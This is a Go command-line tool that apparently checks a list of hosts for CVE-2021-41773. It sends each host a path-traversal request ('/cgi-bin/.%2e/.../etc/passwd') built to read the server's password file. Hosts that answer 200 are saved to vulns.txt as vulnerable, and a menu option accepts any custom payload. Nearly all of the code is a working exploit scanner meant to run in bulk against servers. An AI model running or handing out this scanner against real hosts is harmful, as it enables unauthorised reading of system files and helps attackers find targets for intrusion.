package main

import(
	"fmt"
	"os"
	"log"
	"bufio"
	"net/http"
	"strings"
)

const erro string = "[!] "
const info string = "[i] "
const succ string = "[*] "

const save_file string = "vulns.txt"

func input(msg string){
	fmt.Print("demon/" + msg + "~: ")
}

func check_vuln(host string, sender_payload string){

	res, err := http.Get(host + sender_payload)

	if err != nil{
		fmt.Println(erro + "Could not connect")
		log.Fatal(err)
	}
	res.Body.Close()

	stat := res.StatusCode
//	server := "Server: " + res.Header.Get("Server")

	if stat == http.StatusOK{
		fmt.Println(succ + host  + " <-- Vuln")

		saver, err_sv := os.OpenFile(save_file, os.O_APPEND|os.O_WRONLY, 0644)
		if err_sv != nil{
			fmt.Println(erro + "Could not open file to save hosts")
		}
		defer saver.Close()
		saver.WriteString(host + "\n")

	} else if stat == http.StatusForbidden{
		fmt.Println(erro + host + " <-- Forbidden")
	} else if stat == http.StatusNotFound{
		fmt.Println(erro + host + " <-- Not Found")
	} else {
		fmt.Println(erro + host + " <--", stat)
	}

}

func check_hosts(path string, payload string){
	fmt.Println()

	if _, status_f := os.Stat(save_file); status_f != nil{
		if os.IsNotExist(status_f){
			saves, err_s := os.Create(save_file)
			if err_s != nil{
				fmt.Println(erro + "Could not create file to save hosts")
				log.Fatal(err_s)
			}
			defer saves.Close()
		}
	}

	file, err := os.Open(path)
	if err != nil{
		fmt.Println(erro + "Could not open file")
		log.Fatal(err)
	}

	scanFd := bufio.NewScanner(file)
	scanFd.Split(bufio.ScanLines)
	var lines []string

	for scanFd.Scan(){
		lines = append(lines, scanFd.Text())
	}
	defer file.Close()

	for _, line := range lines{
		check_vuln(strings.TrimSuffix(line, "/"), payload)
	}
}

func main(){
	payload := "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
	var option int
	var file string

	banner := `
      ,  ,  , , ,
     <(__)> | | |
     | \/ | \_|_/
     \^  ^/   |
     /\--/\  /|
    /  \/  \/ |

   | Check CVE-2021-41773
   | Author: vida

   [1] Check Hosts
   [2] Custom Payload
   `

	fmt.Println(banner)
	fmt.Print("demon~: ")
	fmt.Scanln(&option)

	if option == 1{
		input("file")
		fmt.Scanln(&file)
		check_hosts(file, payload)
	} else if option == 2{
		input("payload")
		fmt.Scanln(&payload)
		input("file")
		fmt.Scanln(&file)
		check_hosts(file, payload)
	} else {
		fmt.Println("\n" + erro + "Invalid Option")
		os.Exit(22)
	}
}
